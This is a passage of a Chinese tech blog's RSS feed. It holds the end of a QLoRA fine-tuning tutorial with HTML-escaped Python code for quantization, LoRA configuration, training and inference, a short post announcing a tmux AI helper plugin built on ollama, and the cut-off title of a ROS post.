&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;quant_config &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; BitsAndBytesConfig(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    load_in_4bit&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bnb_4bit_quant_type&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;nf4&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bnb_4bit_compute_dtype&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;compute_dtype,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bnb_4bit_use_double_quant&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;False&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;if&lt;/span&gt; torch&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;backends&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;mps&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;is_available():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Using &amp;#39;mps&amp;#39; (Apple Silicon)&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    active_device &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; torch&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;device(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;mps&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    model &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; AutoModelForCausalLM&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;from_pretrained(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        pretrained_model_name_or_path&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;base_model,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        trust_remote_code&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        low_cpu_mem_usage&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        device_map&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;active_device
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;elif&lt;/span&gt; torch&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;cuda&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;is_available():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Using GPU&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    active_device &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; torch&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;device(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;cuda&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    model &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; AutoModelForCausalLM&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;from_pretrained(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        base_model,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        quantization_config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;quant_config,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        device_map&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;active_device
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;else&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Using CPU&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    active_device &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; torch&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;device(&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;cpu&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    model &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; AutoModelForCausalLM&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;from_pretrained(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        base_model,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        quantization_config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;quant_config,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        device_map&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;active_device
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;model&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;config&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;use_cache &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;model&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;config&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;pretraining_tp &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;6-加载模型的-tokenizer&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#6-%e5%8a%a0%e8%bd%bd%e6%a8%a1%e5%9e%8b%e7%9a%84-tokenizer&#34;&gt;
        ##
    &lt;/a&gt;
    6. 加载模型的 tokenizer
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tokenizer &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; AutoTokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;from_pretrained(base_model, trust_remote_code&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;pad_token &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; tokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;eos_token
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;padding_side &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;right&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;7-配置-peft-参数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#7-%e9%85%8d%e7%bd%ae-peft-%e5%8f%82%e6%95%b0&#34;&gt;
        ##
    &lt;/a&gt;
    7. 配置 PEFT 参数
&lt;/div&gt;
&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://huggingface.co/docs/peft/conceptual_guides/lora&#34;&gt;Parameter-Efficient Fine-Tuning (PEFT) &lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://arxiv.org/abs/2305.14314&#34;&gt;&amp;ldquo;QLoRA&amp;rdquo;&lt;/a&gt;
&lt;img src=&#34;https://images.datacamp.com/image/upload/v1697713094/image7_3e12912d0d.png&#34; alt=&#34;QLoRA&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;peft_params &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; LoraConfig(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    lora_alpha&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;16&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    lora_dropout&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;0.1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;64&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    bias&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    task_type&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;CAUSAL_LM&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;8-配置训练参数&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#8-%e9%85%8d%e7%bd%ae%e8%ae%ad%e7%bb%83%e5%8f%82%e6%95%b0&#34;&gt;
        ##
    &lt;/a&gt;
    8. 配置训练参数
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;training_params &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; TrainingArguments(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	output_dir&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;./results&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	num_train_epochs&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	per_device_train_batch_size&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;4&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	gradient_accumulation_steps&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	gradient_checkpointing &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	learning_rate&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;2e-4&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	weight_decay&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;0.001&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	lr_scheduler_type&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;constant&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	warmup_ratio&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;0.03&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	max_grad_norm&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;0.3&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	max_steps&lt;span style=&#34;color:#ff6ac1&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;1&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	save_steps&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;25&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	logging_steps&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;25&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	logging_dir&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;./logs&amp;#34;&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	group_by_length&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	fp16&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;False&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	report_to&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;tensorboard&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	adam_beta2&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;0.999&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_train&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;9-模型微调训练&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#9-%e6%a8%a1%e5%9e%8b%e5%be%ae%e8%b0%83%e8%ae%ad%e7%bb%83&#34;&gt;
        ##
    &lt;/a&gt;
    9. 模型微调训练
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trainer &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; SFTTrainer(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    model&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;model,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    train_dataset&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;dataset_train,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    peft_config&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;peft_params,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dataset_text_field&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;text&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    max_seq_length&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;None&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    tokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;tokenizer,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    args&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;training_params,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    packing&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff6ac1&#34;&gt;False&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trainer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;train()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;10-保存训练好的模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#10-%e4%bf%9d%e5%ad%98%e8%ae%ad%e7%bb%83%e5%a5%bd%e7%9a%84%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    10. 保存训练好的模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trainer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;model&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;save_pretrained(new_model)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;trainer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;tokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;save_pretrained(new_model)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;11-使用模型&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#11-%e4%bd%bf%e7%94%a8%e6%a8%a1%e5%9e%8b&#34;&gt;
        ##
    &lt;/a&gt;
    11. 使用模型
&lt;/div&gt;
&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;logging&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;set_verbosity(logging&lt;span style=&#34;color:#ff6ac1&#34;&gt;.&lt;/span&gt;CRITICAL)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;prompt &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;Who is Leonardo Da Vinci?&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pipe &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; pipeline(task&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;text-generation&amp;#34;&lt;/span&gt;, model&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;model, tokenizer&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;tokenizer, max_length&lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ff9f43&#34;&gt;200&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;result &lt;span style=&#34;color:#ff6ac1&#34;&gt;=&lt;/span&gt; pipe(&lt;span style=&#34;color:#5af78e&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#34;&amp;lt;s&amp;gt;[INST] &lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt;{&lt;/span&gt;prompt&lt;span style=&#34;color:#5af78e&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#5af78e&#34;&gt; [/INST]&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff5c57&#34;&gt;print&lt;/span&gt;(result[&lt;span style=&#34;color:#ff9f43&#34;&gt;0&lt;/span&gt;][&lt;span style=&#34;color:#5af78e&#34;&gt;&amp;#39;generated_text&amp;#39;&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>tmux AI 助手</title>
      <link>/2024/04/tmux-ai-%E5%8A%A9%E6%89%8B/</link>
      <pubDate>Thu, 04 Apr 2024 17:06:50 +0000</pubDate>
      <author>**Email:** [singleye512@gmail.com](mailto:singleye512@gmail.com) (singleye)</author>
      <guid>/2024/04/tmux-ai-%E5%8A%A9%E6%89%8B/</guid>
      <description>&lt;p&gt;&lt;img src=&#34;https://singleye-public-read.oss-cn-shanghai.aliyuncs.com/singleye.net/static/MachineLearning/tmux_ai_helper/demo.gif&#34; alt=&#34;demo&#34;&gt;&lt;/p&gt;
&lt;p&gt;日产开发时很喜欢用 tmux，最近写了一个 tmux 的 AI 插件，这个插件可以使用 ollama 支持的 LLM 生成 shell / 编程相关的内容，会对日常使用 CLI 的同学们带来一些帮助。&lt;/p&gt;
&lt;p&gt;使用方法： &lt;prefix&gt; + Q 调出命令输入栏，在输入栏中写好问题回车，之后 tmux 会把生成的答案在新的窗口中显示出来。&lt;/p&gt;
&lt;p&gt;项目链接： &lt;a href=&#34;https://github.com/singleye/tmux-ai-helper&#34;&gt;https://github.com/singleye/tmux-ai-helper&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>使用 ros::waitForShutdown() 导致 dynamic_reconfigure::Server 无法正常获取配置更新的问题</title>
